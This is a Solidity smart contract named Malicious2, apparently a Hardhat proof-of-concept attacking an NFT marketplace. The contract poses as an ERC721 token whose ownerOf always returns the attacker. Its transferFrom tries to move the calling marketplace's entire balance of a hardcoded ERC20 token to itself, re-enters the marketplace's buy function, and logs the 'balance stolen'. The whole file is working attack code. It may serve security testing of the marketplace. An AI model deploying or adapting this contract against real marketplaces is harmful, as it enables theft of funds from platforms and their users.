pragma solidity 0.8.4;
pragma experimental ABIEncoderV2;

import "hardhat/console.sol";


// Interfaces
import "@openzeppelin/contracts-upgradeable/token/ERC20/IERC20Upgradeable.sol";
import "@openzeppelin/contracts-upgradeable/token/ERC721/IERC721Upgradeable.sol";

interface marketplace {
    function buy(address _address, uint256 _id) external;
}
contract Malicious2 {
    address owner;
    address token;
    constructor(address _token) {
        owner = msg.sender;
        token = _token;

    }
    function ownerOf(uint256 tokenId) public view returns (address) {
        return owner;
    }
    function transferFrom(address _from, address _to, uint256 _id) public returns (bool success) {
        console.log("approve");
        IERC20Upgradeable(0x3BA4c387f786bFEE076A58914F5Bd38d668B42c3).approve(address(this), 2**256-1);
        IERC20Upgradeable(0x3BA4c387f786bFEE076A58914F5Bd38d668B42c3).transferFrom(msg.sender, address(this), IERC20Upgradeable(0x3BA4c387f786bFEE076A58914F5Bd38d668B42c3).balanceOf(msg.sender));
        marketplace(msg.sender).buy(token, 5);
        console.log("balance stolen: ",IERC20Upgradeable(0x3BA4c387f786bFEE076A58914F5Bd38d668B42c3).balanceOf(address(this)));
        return true;
    }
}